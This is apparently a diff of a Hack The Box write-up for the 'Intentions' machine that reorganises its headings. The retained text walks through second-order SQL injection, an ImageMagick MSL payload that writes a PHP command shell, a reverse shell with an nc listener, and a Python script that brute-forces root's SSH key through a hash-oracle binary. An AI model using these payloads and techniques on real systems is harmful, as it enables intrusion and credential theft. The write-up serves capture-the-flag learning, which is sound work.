@@ -7,18 +7,19 @@ tags: SQLI HTB
 
 
 
-![Inetions box card](/assets/1688114839753.jpg)
+![Inetions box card](/assets/img/Intentions/1688114839753.jpg)
 
-# Introduction
+## Introduction
 
+Intentions was a very interesting machine that put a heavy emphasis on proper enumeration of the machine as multiple pieces were needed to be found to piece together the initial access vector. The privesc was about thinking outside of the box related to badly designed custom binary.
 
-# Recon
+## Initial access
+### Recon
 
 To start our recon off we will start with an Nmap scan of all the TCP ports. using the following command
 ```
 sudo nmap -sS -A -p- 10.10.11.220 -v -oN nmap
 ```
-
 
 **Nmap**
 ```
@@ -74,15 +75,14 @@ OS and Service detection performed. Please report any incorrect results at https
 
 Seeing that Nmap only showed two ports open one being HTTP and the other SSH I decided to check out the website first to look for any web vulnerabilities.
 
-# Foothold
-## Web application 
+### Web application Second order SQLI
 
 When browsing to the web application you needed to create an account to log into it. After registering into the application i noticed that the amount of functionality was rather limited. The thing that looked odd was whenever changing the Favorite Genre's tab in the profile the pictures in your feed would change.
-![Profile Genre's changed](/assets/Intentions_1.png)
+![Profile Genre's changed](/assets/img/Intentions/Intentions_1.png)
 
 After changing the value we could see below that our image feed was empty. This makes me believe that there is a posibility for Second hand SQL injection here.
 
-![Data feed empty](/assets/Intentions_2.png)
+![Data feed empty](/assets/img/Intentions/Intentions_2.png)
 
 I'm going to use SQLmap to speed up the process of the SQL injection. The easiest way to do this is by taking the web requests for both the injection request and the second hand request.
 
@@ -243,6 +243,8 @@ After running this for a little while we ended up with the following output incl
 ```
 I tried to crack these hashes however this was unsuccessful. This means i must have missed something and continued my enumeration of the box.
 
+### Accessing the Admin panel
+
 I decided to run dirsearch to try and find any files or web pages which might not be linked. It is importent to use the cookies from one of the previous requests otherwise you'll be scanning unauthenticated and get less results.
 ```
 dirsearch  -r -u http://10.10.11.220/js --proxy=http://127.0.0.1:8080 --cookie="XSRF-TOKEN=eyJpdiI6InUzYUFNMGVwcTQxUlF0QlV6Z1lTRGc9PSIsInZhbHVlIjoiWXF6VFdTRUxKNjg0SE5Vc0syMXNZNlBGMmMrdmZ2ZzZPNmV1WEdHMko5WTErY2NPeXBUM3M3WUpSRzhKQVNaSDNIRmZreC9KQXFwczgvYzFLT1lXUldWcVV0U0piMTdkaVZHVXZDTmpTbE9hcytPa3NpYnRwRkNSVVFISFlMaDMiLCJtYWMiOiJhMWU5OGFhOTYxYzgwOTBlYzFiZmQzNmE3OWYyYTVlNzA4YzYyYmNlMzc4MDYxNTIyMTM4NGQ4YTJkODY0N2FhIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6Ik4xbnZ0UjRrMVlOQjA3MFNRR2ovTXc9PSIsInZhbHVlIjoiWTJKbW9WUWdjczRFR3B1VkRDWFE4NkFSdklsZFh3UFhBNGxnTFltTER2YkhwaHN6TmVHWndPSVJna2FKM09RK3ZRSG1rb1NYaTQvYVJ1Yzd4dnN4d3RVVGVlNzVaeDFKNVpsUmtkRkZBR3BpSjdySklzYUxSYnJLc0YzQksxU3UiLCJtYWMiOiJkMzVlMjZjNDE4YmNjOGZlNGYxMmZmNzY0OGQ4ZjE3YzZlYjAzMDFjMjRhNjAxNTRmZmU0OGMxMGMxMmNhZGUxIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNjk3Mjg0NjU0LCJleHAiOjE2OTczMDYyNTQsIm5iZiI6MTY5NzI4NDY1NCwianRpIjoiZzZzNTZReGFoRG16SFNuZyIsInN1YiI6IjMxIiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.tnyyIOfboawY1Wmw6jIJF_GgwKMG8AqUDzrfV-u6H2k"
@@ -331,10 +333,12 @@ By adding this cookie to your browser session you could log into the admin pages
 ```
 token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92Mi9hdXRoL2xvZ2luIiwiaWF0IjoxNjk3MjkzMDIzLCJleHAiOjE2OTczMTQ2MjMsIm5iZiI6MTY5NzI5MzAyMywianRpIjoiMzhnTmMxRGtIZ0lQREJGcSIsInN1YiI6IjIiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.HBdW-t5hCQ8e71PJp04u0FfkDBZoduAtVY7Pp9BmWsE
 ```
+### Code execution: Imagemagick
+
 
 On the front page there seems to be a pretty big hint about what service is being used to modify pictures in the background. there is a link to the manual page of imagemagick.
 
-![ImageMagick hint](/assets/Intentions_3.png)
+![ImageMagick hint](/assets/img/Intentions/Intentions_3.png)
 
 https://www.php.net/manual/en/class.imagick.php
 
@@ -344,7 +348,8 @@ After googling around a little for vulnerabilities with this library i stumbled 
 https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/
 
 
-To put it in short  some vulnerabilities were found in ImageMagick's MSL format. it is possible to write files by suplying a specifically crafted msl file. I created the following MSL file to create a very basic command injection payload in php. this command injection is then written to 
+In short, it's possible to write files to write files to the server by supplying a specifically crafted msl file.
+. I created the following MSL file to create a very basic command injection payload in php. this command injection is then written to 
 **/var/www/html/intentions/public/calico.php**
 ```
 <?xml version="1.0" encoding="UTF-8"?>
@@ -364,7 +369,7 @@ This request will give an error gateway timed out. this is normal because the fu
 ```
 http://10.10.11.220/calico.php?a=system("whoami");
 ```
-![Code Execution](/assets/Intentions_4.png)
+![Code Execution](/assets/img/Intentions/Intentions_4.png)
 
 Great we have code execution. But lets upgrade this to a full reverse shell next. Usually when dealing with command execution through a url i base64 my reverse shell to have less issues with syntax. 
 
@@ -389,7 +394,9 @@ Before executing this don't forget to turn on your listener
 ```
 nc -lvp 443
 ```
-![Reverse shell](/assets/Intentions_5.png)
+![Reverse shell](/assets/img/Intentions/Intentions_5.png)
+
+### Lateral movement to other user
 
 So now we have a reverse shell as www-data its time to escalate this to user privileges.  After looking around i noticed that there was a .git folder with multiple commits present. When i tried to view these i was getting errors that this folder wasn't trusted and www-data was not able to view these files. Next i then archived the entire .git folder into a tarball and placed in the public part of the web application so i could easily download it.
 
@@ -479,10 +486,10 @@ Next we want to check if these credentials are valid for SSH as well and in this
 ```
 ssh greg@10.10.11.220
 ```
-![SSH as Greg](/assets/Intentions_6.png)
+![SSH as Greg](/assets/img/Intentions/Intentions_6.png)
 
-# Privesc
-
+## Privilege escalation
+### Discovery
 After doing the basic enumeration a non standard binary file popped up owned by root and the scanner group. Then i checked and our user Greg is part of the scanner group allowing him to execute this binary as well.
 
 ```
@@ -595,20 +602,22 @@ The copyright_scanner application provides the capability to evaluate a single f
   -s string
     	Specific hash to check against. Not compatible with -h
 ```
+### Exploiting
+
 
 So looking at the help function the binary is used to create MD5 hash  of files to check them if they aren't causing any copyright issues. The interesting part of this binary is that we can select the amount of bytes which would allow us to brute force a file one character at a time. First we'd need to find a file worth stealing owned by root, the first thing that comes to mind is an SSH key so i tried to verify its existance by running the following command 
 
 ```
 /opt/scanner/scanner -c /root/.ssh/id_rsa -s 0 -p
 ```
-![Proof SSH key exists](/assets/Intentions_7.png)
+![Proof SSH key exists](/assets/img/Intentions/Intentions_7.png)
 
 So this proved that the SSH key does indeed exist next i wanted to see if i could take the hash of just one byte. I tried this with the following command:
 
 ```
 /opt/scanner/scanner -c /root/.ssh/id_rsa -s 0 -p -l 1
 ```
-![Extracting one Character](/assets/Intentions_8.png)
+![Extracting one Character](/assets/img/Intentions/Intentions_8.png)
 
 Knowing we can select the length of the file we can then just brute force this by calculating the hashes ourselves. To do this automated i created a python script and will go over it step by step.
 
@@ -652,17 +661,17 @@ print(current_read)
 
 After running the script we will be presented with the private SSH key of the root user
 
-![Extracting the file](/assets/Intentions_9.png)
+![Extracting the file](/assets/img/Intentions/Intentions_9.png)
 
 Save this text to a file and use it to log into the machine as root using ssh 
 
-![Access as root](/assets/Intentions_10.png)
+![Access as root](/assets/img/Intentions/Intentions_10.png)
 
 
 
-## Detailed overview code
+### Detailed overview code
 
-### Variables
+#### Variables
 First up we setup some variables we'll need later down the line.
 - **file_to_brute** is the full path of the file we want to try and retrieve.
 - **charset** is the set of characters we will be using for our brutforcing. I chose for string.printable because an SSH key does not have any unpritable characters so checking for those would be a waste of time.
@@ -674,7 +683,7 @@ charset = string.printable
 current_read = ""
 ```
 
-### get_hash function
+#### get_hash function
 
 The get hash function is as the name sugests the function we use to obtain the hash of the file we want to extract. This function will get looped through each time increasing the amount (i) of bytes we want to retrieve. The scanner binary would output the data as the following:  [DEBUG] /root/.ssh/id_rsa has hash 336d5ebc5436534e61d16e63ddfca327 
 This data is not usable so i added the **.split(" ")[-1].rstrip()** parameters at the end to only use the last part of the string containing the hash. This hash will then be returned back to the main function.
@@ -686,7 +695,7 @@ def get_hash(i):
 ```
 
 
-### find_char function
+#### find_char function
 
 So in the previous function we obtained the hash of the file with a specific length. in this function we'll try to brute force what those characters are. We will loop through every letter in our character set to try and find the right character. Each time we add the next letter in the character set to our already verified amount of bytes of data. Then we'll make an MD5 hash of this combination, if the hash matches it will break out of the loop returning the value it found. If it didn't match it will keep retrying till it finds the right printable character.
 
@@ -700,7 +709,7 @@ def find_char(temp_hash):
             return i
     return None
 ```
-### main loop 
+#### main loop 
 
 The main loop uses the previously explained functions to automate the brute forcing of the file. First it runs the get_hash function using our incrementing counter to always take one byte more per loop. next it feeds that hash value into the find_char function to brute force this specific character. Each time it finds a new character it adds it to the current_read variable slowly building up the entire file. If it doesn't find a new character anymore it means the file is finished and we can output the results.
 
